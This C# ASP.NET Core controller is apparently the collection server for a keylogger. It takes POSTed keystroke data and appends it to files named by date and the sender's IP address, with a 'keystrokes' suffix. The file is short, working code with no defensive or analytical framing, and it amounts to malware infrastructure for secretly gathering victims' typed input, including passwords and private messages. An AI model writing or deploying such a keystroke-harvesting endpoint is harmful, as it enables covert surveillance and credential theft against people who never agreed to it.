using System.Net;
using Microsoft.AspNetCore.Mvc;

namespace WebServer.Controllers;

[ApiController]
[Route("[controller]")]
public class LogKeyStrokeController : ControllerBase
{
    private readonly ILogger<LogKeyStrokeController> _logger;
    public LogKeyStrokeController(ILogger<LogKeyStrokeController> logger)
    {
        _logger = logger;
    }

    [HttpPost]
    public async Task<ActionResult> Post([FromBody] string data)
    {
        IPAddress? remoteIpAddress = Request.HttpContext.Connection.RemoteIpAddress;

        _logger.LogInformation("Received data");

        await System.IO.File.AppendAllTextAsync($"{DateTime.Now:dd-MM-yyyy}-{remoteIpAddress?.MapToIPv4().ToString()}-keystrokes", data);
        
        return Ok();
    }
}